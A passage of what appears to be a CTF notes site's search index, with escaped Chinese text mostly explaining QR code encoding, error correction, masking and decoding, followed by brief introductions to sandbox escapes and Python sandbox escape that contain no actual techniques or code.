\u7684\u4e8c\u8fdb\u5236\u4e32\uff089 -> 1001 \uff09 \u7136\u540e\u5f00\u5934\u52a0\u4e0a\u6570\u5b57\u6a21\u5f0f\u6807\u8bc6\u7b26 0001 \u548c\u6570\u91cf\u6807\u8bc6\u7b26\uff08\u5b57\u7b26\u4e2a\u6570\u8f6c\u4e3a\u4e8c\u8fdb\u5236\uff0c\u5e76\u5f00\u5934\u88650\u81f3\u957f\u5ea6\uff0c\u957f\u5ea6\u7531\u7248\u672c\u51b3\u5b9a\uff0c\u89c1\u4e0a 7.4.1 \u90e8\u5206\u7684\u7b2c\u4e8c\u4e2a\u8868\uff09 \u4f8b\u5b50 \u6570\u636e\u5185\u5bb9\uff1a 01234567 \uff08\u4fdd\u7559\u5f00\u59340\uff09 \u6570\u636e\u6d41\u90e8\u5206\uff1a \u6570\u5b57\u6a21\u5f0f\u6807\u8bc6\u7b26\uff1a 0001 \u6570\u91cf\u6807\u8bc6\u7b26\uff1a 0000001000 \uff088\uff0c\u4e14\u7248\u672c1\u4e0b\u89c4\u5b9a\u4e3a 10 bits\uff09 \u6570\u636e\uff1a 012 -> 0000001100 345 -> 0101011001 67 -> 1000011 \u5b8c\u6574\u6570\u636e\u6bd4\u7279\u6d41\uff1a 0001 0000001000 0000001100 0101011001 1000011 \u6570\u5b57\u6a21\u5f0f\u4e0b\u7684\u6bd4\u7279\u6d41\u957f\u5ea6\u4e3a\uff1a \\[ B=M+C+10\\times\\lfloor\\frac{D}{3}\\rfloor+R \\] \u5176\u4e2d M \u4e3a 4\uff0cC \u4e3a\u6570\u91cf\u6807\u8bc6\u7b26\u957f\u5ea6\uff08\u7248\u672c1\uff5e9\u4e3a 10\uff0c\u7248\u672c10\uff5e26\u4e3a 12\uff0c\u7248\u672c27\uff5e40\u4e3a 14\uff09\uff0cD\u4e3a\u8f93\u5165\u5b57\u7b26\u4e2a\u6570\uff0cR\u4e3a\u5269\u4f59\u90e8\u5206\uff08\u82e5 D mod 3 = 0 \u5219\u4e3a 0\uff0c\u82e5 D mod 3 = 1 \u5219\u4e3a 4\uff0c\u82e5 D mod 3 = 2 \u5219\u4e3a 7\uff09","title":"\u6570\u5b57\u6a21\u5f0f\uff087.4.3\uff09"},{"location":"ctf/qrcode/#744","text":"\u6570\u5b57\u5b57\u6bcd\u6a21\u5f0f\uff08Alphanumeric mode\uff09\u4e0b\u652f\u6301\u7684\u7f16\u7801\u5b57\u7b26\u670945\u4e2a\uff0c\u628a\u5b83\u4eec\u4ece0\u7f16\u53f7\u81f344\u3002\u5176\u4e2d 0-9 \u5bf9\u5e94\u6570\u5b57 0-9\uff0c10-35 \u5bf9\u5e94\u5b57\u6bcd A-Z\uff0c36-44 \u5bf9\u5e949\u4e2a\u7b26\u53f7\uff1a \u8f93\u5165\u7684\u5b57\u7b26\u5148\u6309\u7167\u4e0a\u8868\u8f6c\u6362\u4e3a\u6570\u503c\uff0c\u7136\u540e\u5206\u4e3a\u4e24\u4e2a\u4e00\u7ec4\uff0c\u6bcf\u4e00\u7ec4\u5185\u628a \u7b2c\u4e00\u4e2a\u6570\u503c \u00d7 45 + \u7b2c\u4e8c\u4e2a\u6570\u503c\uff0c\u518d\u8f6c\u6362\u4e3a\u957f\u5ea6\u4e3a 11 bits \u7684\u4e8c\u8fdb\u5236\u4e32\uff08\u6700\u5927\u4e3a 44\u00d745+44=2024 -> 11111101000 \uff09\u3002\u5982\u679c\u5b57\u7b26\u957f\u5ea6\u4e3a\u5947\u6570\uff0c\u5219\u4f1a\u5269\u4f59\u51fa\u4e00\u4e2a\u5b57\u7b26\uff0c\u9700\u8981\u5c06\u5176\u503c\u8f6c\u6362\u4e3a\u957f\u5ea6\u4e3a 6 bits \u7684\u4e8c\u8fdb\u5236\u4e32\uff08\u6700\u5927\u4e3a 11 -> 101100 \uff09 \u7136\u540e\u5f00\u5934\u52a0\u4e0a\u5b57\u6bcd\u6570\u5b57\u6a21\u5f0f\u6807\u8bc6\u7b26 0010 \u548c\u6570\u91cf\u6807\u8bc6\u7b26\uff08\u957f\u5ea6\u7531 7.4.1 \u7b2c\u4e8c\u4e2a\u8868\u89c4\u5b9a\uff09 \u4f8b\u5b50 \u6570\u636e\u5185\u5bb9\uff1aAC-42 \u6570\u636e\u6d41\u90e8\u5206\uff1a \u5b57\u6bcd\u6570\u5b57\u6a21\u5f0f\u6807\u8bc6\u7b26\uff1a 0010 \u6570\u91cf\u6807\u8bc6\u7b26\uff1a 000000101 \uff085\uff0c\u4e14\u7248\u672c1\u4e0b\u89c4\u5b9a\u957f\u5ea6\u4e3a9\uff09 \u6570\u636e\uff1aAC-42 -> 10 12 41 4 2 -> (10 12)(41 4)(2) 10 12 -> 10*45+12=462 -> 00111001110 41 4 -> 41*45+4=1849 -> 11100111001 2 -> 2 -> 000010 \u5b8c\u6574\u6570\u636e\u6bd4\u7279\u6d41\uff1a 0010 000000101 00111001110 11100111001 000010 \u5b57\u6bcd\u6570\u5b57\u6a21\u5f0f\u4e0b\u7684\u6bd4\u7279\u6d41\u957f\u5ea6\u4e3a\uff1a \\[B=M+C+11\\times\\lfloor\\frac{D}{2}\\rfloor+6\\times(D\\bmod 2)\\] \u5176\u4e2d M \u4e3a 4\uff0cC \u4e3a\u6570\u91cf\u6807\u8bc6\u7b26\u957f\u5ea6\uff0cD \u4e3a\u539f\u6570\u636e\u957f\u5ea6","title":"\u5b57\u6bcd\u6570\u5b57\u6a21\u5f0f\uff087.4.4\uff09"},{"location":"ctf/qrcode/#745","text":"\u5b57\u8282\u6a21\u5f0f\uff08Byte mode\uff09\u4e0b\u628a\u6bcf\u4e2a\u5b57\u7b26\u6839\u636e Latin-1\uff08ISO/IEC 8859-1\uff09\u7f16\u7801\u6210 8 bits\uff081\u5b57\u8282\uff09\uff0c\u76f4\u63a5\u63a5\u5728\u5b57\u8282\u6a21\u5f0f\u6807\u8bc6\u7b26 0100 \u548c\u6570\u91cf\u6807\u8bc6\u7b26\uff08\u957f\u5ea6\u7531 7.4.1 \u7b2c\u4e8c\u4e2a\u8868\u89c4\u5b9a\uff09\u7684\u540e\u9762\u3002 Latin-1 \u5b57\u8282\u6a21\u5f0f\u4e0b\u7684\u6bd4\u7279\u6d41\u957f\u5ea6\uff1a \\[B=M+C+8\\times D\\] \u5176\u4e2d M \u4e3a 4\uff0cC \u4e3a\u6570\u91cf\u6807\u8bc6\u7b26\u957f\u5ea6\uff0cD \u4e3a\u539f\u6570\u636e\u957f\u5ea6","title":"\u5b57\u8282\u6a21\u5f0f\uff087.4.5\uff09"},{"location":"ctf/qrcode/#747","text":"\u4e00\u4e2a\u4e8c\u7ef4\u7801\u7684\u6570\u636e\u6d41\u4e2d\u4e5f\u53ef\u4ee5\u4f7f\u7528\u591a\u79cd\u6a21\u5f0f\uff0c\u4e14\u4e0d\u9700\u8981\u7279\u522b\u8868\u793a\u3002\u66f4\u6362\u65b0\u7684\u6a21\u5f0f\u65f6\u53ea\u9700\u8981\u6b63\u5e38\u6dfb\u52a0 \u6a21\u5f0f\u6807\u8bc6\u7b26+\u6570\u91cf\u6807\u8bc6\u7b26+\u6570\u636e \u5373\u53ef \u4f8b\u5b50 \u539f\u59cb\u6570\u636e\uff1a123\u6d4b\u8bd5 \u6570\u636e\u6d41\uff1a \u6570\u5b57\u6a21\u5f0f\uff1a \u6807\u8bc6\u7b26\uff1a 0001 \u6570\u91cf\u6807\u8bc6\u7b26\uff1a 0000000011 \uff083\uff0c\u957f\u5ea610\uff09 \u6570\u636e\uff1a123 -> 0001111011 \u5b57\u8282\u6a21\u5f0f\uff1a\u6d4b\u8bd5 -> E6 B5 8B / E8 AF 95 \u6807\u8bc6\u7b26\uff1a 0100 \u6570\u91cf\u6807\u8bc6\u7b26\uff1a 00000110 \uff086\uff0c\u957f\u5ea68\uff09 \u6570\u636e\uff1a \u6d4b -> 11100110 10110101 10001011 \u8bd5 -> 11101000 10101111 10010101 \u5b8c\u6574\u6570\u636e\u6bd4\u7279\u6d41\uff1a 0001 0000000011 0001111011 0100 00000110 11100110 10110101 10001011 11101000 10101111 10010101","title":"\u6df7\u5408\u6a21\u5f0f\uff087.4.7\uff09"},{"location":"ctf/qrcode/#749","text":"\u5728\u6570\u636e\u7684\u672b\u5c3e\u8981\u586b\u51454\u4e2a0\u4f5c\u4e3a\u7ed3\u675f\u7b26\uff0c\u5982\u679c\u5bb9\u91cf\u4e0d\u8db3\u7684\u8bdd\u53ef\u4ee5\u7f29\u77ed\u6216\u7701\u7565 \u5373\u80fd\u586b\u4e0b\u5219\u52a04\u4e2a0\uff0c\u586b\u4e0d\u4e0b\u5219\u80fd\u52a0\u51e0\u4e2a0\u5c31\u52a0\u51e0\u4e2a0","title":"\u7ed3\u675f\u7b26\uff087.4.9\uff09"},{"location":"ctf/qrcode/#padding-bits7410","text":"\u8f6c\u6362\u540e\u7684\u6570\u636e\u6bd4\u7279\u6d41\u8fd8\u9700\u8981\u586b\u5145\u81f3\u4e8c\u7ef4\u7801\u7684\u6570\u636e\u5bb9\u91cf \u9996\u5148\u5148\u7528 0 \u8865\u5145\u6bd4\u7279\u6d41\u957f\u5ea6\u5230 8 \u7684\u6574\u6570\u500d \u7136\u540e\u7528 11101100 \u548c 00010001 \u4ea4\u66ff\u586b\u8865\u5230\u4e8c\u7ef4\u7801\u6570\u636e\u5bb9\u91cf \u5177\u4f53\u7684\u6570\u636e\u5bb9\u91cf\u7531\u7248\u672c\u53f7\u548c\u7ea0\u9519\u7b49\u7ea7\u51b3\u5b9a\uff0c\u4e14\u6570\u636e\u5bb9\u91cf\uff08\u6bd4\u7279\uff09\u4e00\u5b9a\u4e3a8\u7684\u500d\u6570\uff0c\u5b8c\u6574\u6570\u636e\u89c1\u6587\u6863\u7684 33\uff5e36 \u9875\uff08\u6574\u4e2a pdf \u7684\u7b2c 41\uff5e44 \u9875\uff09 \u6ce8 \u8fd9\u4e2a\u5730\u65b9 QRazyBox \u7f51\u7ad9\u5b58\u5728 bug\uff0c\u6709\u65f6\u65e0\u6cd5\u6b63\u5e38\u8bc6\u522b\u586b\u5145\u7684 0 \u6bd4\u7279\u548c padding bits\uff08\u5373\u53ef\u80fd\u628a\u586b\u5145\u7684 0 \u4e2d\u524d\u56db\u4e2a\u89c6\u4e3a\u4e00\u4e2a terminator\uff0c\u628a\u540e\u9762\u7684 0 \u624d\u89c6\u4e3a\u5c5e\u4e8e padding bits \uff09","title":"\u586b\u5145 padding bits\uff087.4.10\uff09"},{"location":"ctf/qrcode/#75","text":"","title":"\u7ea0\u9519\u7801\u7f16\u7801\uff087.5\uff09"},{"location":"ctf/qrcode/#751","text":"\u7ea0\u9519\u5b57\uff08error correction codewords\uff09\u53ef\u4ee5\u7ea0\u6b63\u4e24\u79cd\u9519\u8bef\uff0c\u4e00\u79cd\u662f\u6bd4\u5982\u65e0\u6cd5\u626b\u63cf\u6216\u65e0\u6cd5\u89e3\u7801\u7684\u5df2\u77e5\u4f4d\u7f6e\u7684\u9519\u8bef\u5b57\uff08erasures\uff09\uff0c\u4e00\u79cd\u662f\u672a\u77e5\u4f4d\u7f6e\u7684\u9519\u8bef\u5b57\uff08errors\uff09\uff0c\u4e00\u4e2a erasures \u53ef\u4ee5\u7531\u4e00\u4e2a\u7ea0\u9519\u5b57\u7ea0\u9519\uff0c\u800c\u4e00\u4e2a errors \u9700\u8981\u4e24\u4e2a\u7ea0\u9519\u5b57\u6765\u7ea0\u9519 \u53ef\u4ee5\u7ea0\u9519\u7684 erasures \u548c errors \u7684\u6570\u91cf\u6ee1\u8db3\uff1a \\[e+2t\\leq d-p\\] \u5176\u4e2d \\(e\\) \u662f erasures \u7684\u6570\u91cf\uff0c \\(t\\) \u662f errors \u7684\u6570\u91cf\uff0c \\(d\\) \u662f\u7ea0\u9519\u5b57\u7684\u6570\u91cf\uff0c \\(p\\) \u662f\u88ab\u9519\u8bef\u89e3\u6790\u7684\u4fdd\u62a4\u5b57\u6570\u91cf \u5176\u4e2d \\(p\\) \u7531\u7248\u672c\u51b3\u5b9a\uff1a \\(p=3\\) \uff1a\u7248\u672c 1-L \\(p=2\\) \uff1a\u7248\u672c 1-M\u30012-L \\(p=1\\) \uff1a\u7248\u672c 1-Q\u30011-H\u30013-L \\(p=0\\) \uff1a\u5176\u4ed6\u6240\u6709\u7248\u672c","title":"\u7ea0\u9519\u5bb9\u91cf\uff087.5.1\uff09"},{"location":"ctf/qrcode/#752","text":"","title":"\u751f\u6210\u7ea0\u9519\u7801\uff087.5.2\uff09"},{"location":"ctf/qrcode/#76710","text":"","title":"\u5269\u4f59\u6b65\u9aa4\uff087.6~7.10\uff09"},{"location":"ctf/qrcode/#76","text":"\u9996\u5148\u6309\u7167 2 \u4e2d\u6240\u8ff0\u7ed9\u5b8c\u6574\u4fe1\u606f\u7f16\u7801\u6210\u6570\u636e\u5e8f\u5217\uff0c\u5176\u4e2d\u4e5f\u5305\u542b padding bits\uff0c\u4e14\u957f\u5ea6\u4e3a 8 \u7684\u500d\u6570 \u7136\u540e\u6839\u636e 3.1.1 \u4e2d\u6240\u8bf4\u5bf9\u6570\u636e\u5e8f\u5217\u8fdb\u884c\u5206\u5757\uff0c\u7136\u540e\u5bf9\u6bcf\u5757\u5206\u522b\u751f\u6210\u7ea0\u9519\u7801 \u6700\u540e\u628a\u6570\u636e\u5e8f\u5217\u7684\u6240\u6709\u5757\u6309\u7167\u5b57\u8282\u4f9d\u6b21\u4ea4\u9519\u5408\u6210\u65b0\u7684\u6570\u636e\u5e8f\u5217\uff0c\u7136\u540e\u628a\u7ea0\u9519\u7801\u7684\u6240\u6709\u5757\u6309\u7167\u5b57\u8282\u4ea4\u9519\u5408\u6210\u7ea0\u9519\u7801\u5e8f\u5217\u3002\u628a\u65b0\u7684\u6570\u636e\u5e8f\u5217\u548c\u7ea0\u9519\u7801\u5e8f\u5217\u8fde\u63a5\u5728\u4e00\u8d77\uff0c\u5982\u679c\u603b\u957f\u5ea6\u4e0d\u591f\u4e8c\u7ef4\u7801\u7684\u5bb9\u91cf\uff0c\u5219\u5728\u540e\u9762\u8865\u5145 3/4/7 \u4e2a 0 \u6bd4\u7279\uff08\u9700\u8981\u8865\u591a\u5c11\u5728 Table 1 \u4e2d\u6709\u5b9a\u4e49\uff09 \u800c\u4e14\u8fd9\u6837\u4e5f\u8981\u4fdd\u8bc1\u6700\u77ed\u7684\u6570\u636e\u5757\u5728\u6700\u524d\u9762\uff08\u5df2\u7ecf\u7531 Table 9 \u5b9a\u4e49\uff09 \u6bd4\u5982 5-H \u7248\u672c\u7684\u5e8f\u5217\uff0c\u9700\u8981\u5206\u4e3a 4 \u5757\uff0c\u524d\u4e24\u5757\u662f 11 \u4e2a\u6570\u636e\u5b57\u300122 \u4e2a\u7ea0\u9519\u5b57\uff0c\u540e\u4e24\u5757\u662f 12 \u4e2a\u6570\u636e\u5b57\u300122 \u4e2a\u7ea0\u9519\u5b57\uff1a \u6700\u540e\u7684\u5e8f\u5217\u5c31\u662f \\(D_1,D_{12},D_{23},D_{35},\\cdots,D_{45},D_{34},D_{46},E_1,E_{23},\\cdots,E_{88}\\)","title":"\u5408\u6210\u5e8f\u5217\uff087.6\uff09"},{"location":"ctf/qrcode/#77","text":"\u628a\u524d\u9762\u5408\u6210\u7684\u5b8c\u6574\u6d88\u606f\u5e8f\u5217\u586b\u5230\u4e8c\u7ef4\u7801\u4e2d\uff0c\u9996\u5148\u8981\u5148\u586b\u5145\u529f\u80fd\u56fe\u6848\uff0c\u7136\u540e\u9884\u7559\u51fa\u683c\u5f0f\u4fe1\u606f\u3001\u7248\u672c\u4fe1\u606f\u7684\u4f4d\u7f6e \u586b\u5145\u65f6\u4ee5\u4e24\u5217\u4e3a\u5355\u4f4d\uff0c\u5373\u6bcf\u6b21\u4ea4\u66ff\u586b\u5145\u4e24\u5217\u3002\u4ece\u6700\u53f3\u4e0b\u89d2\u5f00\u59cb\u662f\u6700\u9ad8\u4f4d\u7684\u6bd4\u7279\uff0c\u7136\u540e\u4ece\u53f3\u5411\u5de6\u4ece\u4e0b\u5411\u4e0a\u4ea4\u66ff\u586b\u5145\uff0c\u5230\u4e86\u4e0a\u754c\u65f6\u5de6\u8f6c\u5411\u4e0b\u7ee7\u7eed\u586b\u5145\uff0c\u9047\u5230\u5bf9\u9f50\u56fe\u6848\u76f4\u63a5\u7a7f\u8fc7\uff0c\u9047\u5230\u5bf9\u9f50\u56fe\u6848\u8fb9\u754c\u5219\u53d8\u4e3a\u4e00\u884c \u4e5f\u53ef\u4ee5\u6309\u7167\u5b57\u8282\u6765\u4f9d\u6b21\u586b\u5145\uff0c\u5982\u679c\u662f\u5411\u4e0a\u586b\u5145\uff0c\u5219\u6700\u9ad8\u4f4d\u5728\u4e0b\u7aef\uff0c\u53cd\u4e4b\u5728\u4e0a\u6bb5\u3002\u6bcf\u4e2a\u5b57\u8282\u5757\u5185\u7684\u6700\u9ad8\u4f4d\u5c3d\u91cf\u53d6\u6700\u53f3\u4fa7\u7684\uff0c\u4f46\u5982\u679c\u6700\u4e0b(\u4e0a)\u7aef\u53ea\u6709\u4e00\u4e2a\u6bd4\u7279\u7684\u4f4d\u7f6e\uff0c\u5219\u9009\u5b83\u4f5c\u4e3a\u6700\u9ad8\u6bd4\u7279\u7684\u4f4d\u7f6e \u53cd\u6b63\u6309\u987a\u5e8f\u6b63\u5e38\u586b\u5c31\u884c\u4e86\uff0c\u9047\u5230\u4e1c\u897f\u5c31\u7ed5 \u5177\u4f53\u89c4\u5219","title":"\u586b\u5145\u6570\u636e\uff087.7\uff09"},{"location":"ctf/qrcode/#78","text":"\u586b\u5145\u540e\u7684\u6570\u636e\u8fd8\u8981\u906e\u76d6\u4e00\u5c42\u63a9\u7801\uff08\u5f02\u6216\uff09\u6765\u5e73\u8861\u9ed1\u767d\u5757\u7684\u6570\u91cf\uff0c\u4ee5\u53ca\u51cf\u5c11\u5bb9\u6613\u4ea7\u751f\u626b\u63cf\u9519\u8bef\u7684\u5927\u5757\u548c\u5f62\u4f3c\u529f\u80fd\u56fe\u6848\u7684\u90e8\u5206\u51fa\u73b0 QR \u7801\u4e00\u5171\u6709 8 \u79cd\u63a9\u7801\uff0c\u6bcf\u4e2a\u63a9\u7801\u6709\u4e00\u4e2a 3 bits \u7684\u7f16\u53f7\uff0c\u548c\u4e00\u4e2a\u751f\u6210\u516c\u5f0f\u3002\u8fd9\u4e2a\u516c\u5f0f\u7528\u6765\u751f\u6210\u63a9\u7801\u56fe\u6837\uff0c\u4ee5\u5de6\u4e0a\u4e3a\u539f\u70b9\uff0c\u5411\u53f3\u3001\u4e0b\u4e3a\u6b63\u65b9\u5411\uff0c\u5750\u6807\u6ee1\u8db3\u8fd9\u4e2a\u516c\u5f0f\u7684\u70b9\u5728\u56fe\u6837\u4e2d\u662f\u9ed1\u8272\uff081\uff09\uff0c\u4e0d\u6ee1\u8db3\u7684\u662f\u767d\u8272\uff080\uff09\u3002\u5728\u7248\u672c 1 \u4e2d\u7684\u63a9\u7801\u56fe\u50cf\u8868\u73b0\u4e3a\uff1a \u8fdb\u884c\u63a9\u7801\u64cd\u4f5c\u5c31\u662f\u628a\u9664\u53bb\u529f\u80fd\u56fe\u6848\u548c\u7248\u672c\u4fe1\u606f\u3001\u683c\u5f0f\u4fe1\u606f\u4e4b\u5916\u7684\u6570\u636e\u90e8\u5206\u6bcf\u4e00\u5757\u7684\u503c\u4e0e\u63a9\u7801\u56fe\u6837\u5f02\u6216 \u6574\u4e2a\u64cd\u4f5c\u9700\u8981\u751f\u6210\u5206\u522b\u4f7f\u7528\u4e0d\u540c\u63a9\u7801\u7684 8 \u4e2a\u56fe\u6837\uff0c\u7136\u540e\u8ba1\u7b97\u51fa\u635f\u5931\u5206\u6570\uff08penalty points score\uff09\uff0c\u7136\u540e\u91c7\u7528\u635f\u5931\u5206\u6570\u6700\u5c0f\u7684\u63a9\u7801\u6a21\u5f0f\u4f5c\u4e3a\u6700\u7ec8\u7684\u63a9\u7801\u6a21\u5f0f","title":"\u63a9\u7801\u906e\u76d6\uff087.8\uff09"},{"location":"ctf/qrcode/#79","text":"QRCode \u7684\u683c\u5f0f\u4fe1\u606f\u662f 15 bits \u7684\u5e8f\u5217\uff0c\u5176\u4e2d\u524d 5 \u4f4d\u662f\u6570\u636e\uff0c\u540e 10 \u4f4d\u662f\u9488\u5bf9\u683c\u5f0f\u4fe1\u606f\u7684\u7ea0\u9519\u7801\uff08\u7531 (15, 5) BCH \u7801\u751f\u6210\uff09 5 bits \u7684\u6570\u636e\u524d 2 \u4f4d\u662f\u7ea0\u9519\u7b49\u7ea7\u6807\u8bc6\u7b26\uff0c\u5206\u522b\u662f L -> 01 \u3001M -> 00 \u3001Q -> 11 \u3001H -> 10 \u540e 3 \u4f4d\u662f\u4e0a\u9762\u8bf4\u5230\u7684\u63a9\u7801\u7f16\u53f7 \u7136\u540e\u540e\u63a5 10 bits \u7ea0\u9519\u7801\uff0c\u6700\u540e\u6574\u4f53\u5f02\u6216 101010000010010 \u9632\u6b62\u4ea7\u751f\u5168\u96f6\u6570\u636e\u5e8f\u5217","title":"\u683c\u5f0f\u4fe1\u606f\uff087.9\uff09"},{"location":"ctf/qrcode/#710","text":"\u5728\u7248\u672c 7 \u53ca\u4ee5\u4e0a\u7684\u4e8c\u7ef4\u7801\u4e2d\u9700\u8981\u586b\u5165\u7248\u672c\u4fe1\u606f\u6765\u786e\u4fdd\u51c6\u786e\u5ea6 \u7248\u672c\u4fe1\u606f\u53ea\u50a8\u5b58\u4e86\u8be5\u4e8c\u7ef4\u7801\u7684\u7248\u672c\u53f7\uff087\uff5e40\uff09\uff0c\u4e00\u5171 18 bits\uff0c\u524d 6 bits \u4e3a\u7248\u672c\u53f7\u7684\u4e8c\u8fdb\u5236\uff08\u4ece 000111 \u5230 101000 \uff09\uff0c\u540e 12 bits \u4e3a\u7531 (18, 6) Golay code \u751f\u6210\u7684\u7ea0\u9519\u7801 \u4e0d\u540c\u4e8e\u683c\u5f0f\u4fe1\u606f\uff0c\u56e0\u4e3a\u7248\u672c\u53f7\u4e0d\u4f1a\u51fa\u73b0\u5168\u96f6\uff0c\u6240\u4ee5\u4e0d\u9700\u8981\u8fdb\u884c\u63a9\u7801\u64cd\u4f5c","title":"\u7248\u672c\u4fe1\u606f\uff087.10\uff09"},{"location":"ctf/qrcode/#11annex-b","text":"\u7b80\u8981\u7684\u89e3\u7801\u8fc7\u7a0b\uff1a \u5b9a\u4f4d\u5e76\u83b7\u53d6\u56fe\u50cf\u4e2d\u7684\u4e8c\u7ef4\u7801\uff0c\u5e76\u628a\u56fe\u50cf\u4e2d\u7684\u9ed1\u767d\u5757\u63d0\u53d6\u4e3a 1 \u548c 0 \u8bfb\u53d6\u683c\u5f0f\u4fe1\u606f \u91ca\u653e\u63a9\u7801 101010000010010 \u8fdb\u884c\u7ea0\u9519 \u5982\u679c\u7ea0\u9519\u5931\u8d25\u5219\u5c06\u4e8c\u7ef4\u7801\u955c\u9762\u5bf9\u79f0\u518d\u5c1d\u8bd5 \u8bfb\u53d6\u7248\u672c\u4fe1\u606f\uff08\u5982\u679c\u6709\u7684\u8bdd\uff09 \u8bfb\u53d6\u683c\u5f0f\u4fe1\u606f\u4e2d\u7684\u63a9\u7801\u7f16\u53f7\uff0c\u5e76\u91ca\u653e\u63a9\u7801 \u8bfb\u53d6\u5e76\u6062\u590d\u6570\u636e\u5b57\u548c\u7ea0\u9519\u5b57 \u7ea0\u9519\uff0c\u5982\u679c\u68c0\u6d4b\u5230\u4e86\u9519\u8bef\u5c31\u7ea0\u6b63 \u628a\u6570\u636e\u5b57\u89e3\u7801\u5f97\u5230\u7ed3\u679c","title":"\u89e3\u7801\uff0811\u3001Annex B\uff09"},{"location":"ctf/qrcode/#annex-b","text":"Annex B \u8bb2\u7684\u7ea0\u9519\u8fc7\u7a0b\u5f88\u7b80\u7565\uff0c\u800c\u4e14\u7b26\u53f7\u8bf4\u660e\u4e0d\u5168\uff0c\u5f88\u96be\u770b\u61c2 \u53bb\u5b66\u4e86\u5b66 PGZ \u89e3\u7801\uff1a Reed\u2013Solomon_error_correction#Peterson\u2013Gorenstein\u2013Zierler_decoder \u8bbe\u5f53\u524d\u7248\u672c\u4e0b\u6bcf\u5757\u4e2d\u6709 \\(n\\) \u4e2a\u5b57\uff0c \\(k\\) \u4e2a\u6570\u636e\u5b57\uff0c \\(n-k\\) \u4e2a\u7ea0\u9519\u5b57\uff0c\u7ea0\u9519\u5bb9\u91cf\u4e3a \\(\\nu\\) \u9996\u5148\u5b9a\u4e49\u539f\u6765\u7684\u5b8c\u6574\u6570\u636e\uff08\u5373\u6570\u636e\u5b57\u548c\u7ea0\u9519\u5b57\uff09\u4ece\u9ad8\u4f4d\u5230\u4f4e\u4f4d\u4e3a \\(c_{n-1},c_{n-2},\\cdots,c_0\\) \uff0c\u5bf9\u5e94\u591a\u9879\u5f0f\u4e3a\uff1a \\[s(x)=\\sum_{i=0}^{n-1}c_ix^i=c_{n-1}x^{n-1}+c_{n-2}x^{n-2}+\\cdots+c_0\\] \u800c\u4e14\u6839\u636e\u7ea0\u9519\u7801\u751f\u6210\u539f\u7406\uff0c \\(s(x)\\) \u53ef\u4ee5\u88ab\u751f\u6210\u591a\u9879\u5f0f \\(g(x)\\) \u6574\u9664\uff0c\u5176\u4e2d \\[g(x)=\\prod_{i=0}^{n-k-1}(x-\\alpha^i)\\] \u6240\u4ee5 \\(s(x)\\) \u4e5f\u6709\u6839 \\(s(\\alpha^i)=0, i=0,1,\\dots n-k-1\\) \u518d\u8bbe\u63a5\u6536\u5230\u7684\u6d88\u606f\u591a\u9879\u5f0f\uff08\u53ef\u80fd\u6709\u9519\uff09\u4e3a \\(r(x)\\) \uff0c\u8bef\u5dee\u591a\u9879\u5f0f\u4e3a \\(e(x)\\) \uff0c\u6ee1\u8db3\uff1a \\[r(x)=s(x)+e(x),\\quad e(x)=\\sum_{i=0}^{n-1}e_ix^i\\] \u5148\u8bbe\u4e00\u5171\u6709 \\(\\nu\\) \u4e2a\u9519\u8bef\uff0c\u4e14\u6bcf\u4e2a\u9519\u8bef\u7684\u4f4d\u7f6e\u4e3a \\(i_k,k=0,1,\\dots \\nu-1\\) \uff0c\u6240\u4ee5\u6709\uff1a \\[e(x)=\\sum_{k=0}^{\\nu-1}e_{i_k}x^{i_k}\\] \u6700\u7ec8\u7684\u76ee\u6807\u5c31\u662f\u627e\u5230\u9519\u8bef\u4e2a\u6570 \\(\\nu\\) \uff0c\u9519\u8bef\u4f4d\u7f6e \\(i_k\\) \uff0c\u4ee5\u53ca\u9519\u8bef\u5927\u5c0f \\(e_{i_k}\\)","title":"\u7ea0\u9519\uff08Annex B\uff09"},{"location":"ctf/escapes/","text":"\u6c99\u7bb1\u9003\u9038 \u00b6 In computer security, a sandbox is a security mechanism for separating running programs, usually in an effort to mitigate system failures and/or software vulnerabilities from spreading. It is often used to execute untested or untrusted programs or code, possibly from unverified or untrusted third parties, suppliers, users or websites, without risking harm to the host machine or operating system. A sandbox typically provides a tightly controlled set of resources for guest programs to run in, such as storage and memory scratch space. \u2014\u2014\u2014\u2014 Wikipedia Abstract CTF \u4e2d\u6709\u4e00\u4e9b\u9898\u76ee\u4f1a\u63d0\u4f9b\u4e00\u4e2a\u6c99\u7bb1\u6765\u8fd0\u884c\u4f60\u7684\u4ee3\u7801\uff0c\u9700\u8981\u9003\u9038\u51fa\u8fd9\u4e2a\u6c99\u7bb1\u6765\u6267\u884c\u4e00\u4e9b\u4ee3\u7801\u6765\u83b7\u53d6\u670d\u52a1\u5668\u4e2d\u5b58\u50a8\u7684 flag \u8fd9\u91cc\u5199\u4e00\u4e9b\u5e38\u89c1\u7684\u901a\u7528\u7684\u6c99\u7bb1\u9003\u9038\u65b9\u6cd5 Table of Contents \u00b6 Python \u6c99\u7bb1\u9003\u9038","title":"\u6c99\u7bb1\u9003\u9038"},{"location":"ctf/escapes/#_1","text":"In computer security, a sandbox is a security mechanism for separating running programs, usually in an effort to mitigate system failures and/or software vulnerabilities from spreading. It is often used to execute untested or untrusted programs or code, possibly from unverified or untrusted third parties, suppliers, users or websites, without risking harm to the host machine or operating system. A sandbox typically provides a tightly controlled set of resources for guest programs to run in, such as storage and memory scratch space. \u2014\u2014\u2014\u2014 Wikipedia Abstract CTF \u4e2d\u6709\u4e00\u4e9b\u9898\u76ee\u4f1a\u63d0\u4f9b\u4e00\u4e2a\u6c99\u7bb1\u6765\u8fd0\u884c\u4f60\u7684\u4ee3\u7801\uff0c\u9700\u8981\u9003\u9038\u51fa\u8fd9\u4e2a\u6c99\u7bb1\u6765\u6267\u884c\u4e00\u4e9b\u4ee3\u7801\u6765\u83b7\u53d6\u670d\u52a1\u5668\u4e2d\u5b58\u50a8\u7684 flag \u8fd9\u91cc\u5199\u4e00\u4e9b\u5e38\u89c1\u7684\u901a\u7528\u7684\u6c99\u7bb1\u9003\u9038\u65b9\u6cd5","title":"\u6c99\u7bb1\u9003\u9038"},{"location":"ctf/escapes/#table-of-contents","text":"Python \u6c99\u7bb1\u9003\u9038","title":"Table of Contents"},{"location":"ctf/escapes/pysandbox/","text":"Python \u6c99\u7bb1\u9003\u9038 \u00b6 \u4e3a\u4ec0\u4e48\u9003\u9038\uff1f \u00b6 Python \u91cc\u7684 eval \u548c exec \u53ef\u4ee5\u7528\u6765\u6267\u884c\u4e00\u4e9b\u4ee3\u7801\u6765\u5e72\u574f\u4e8b 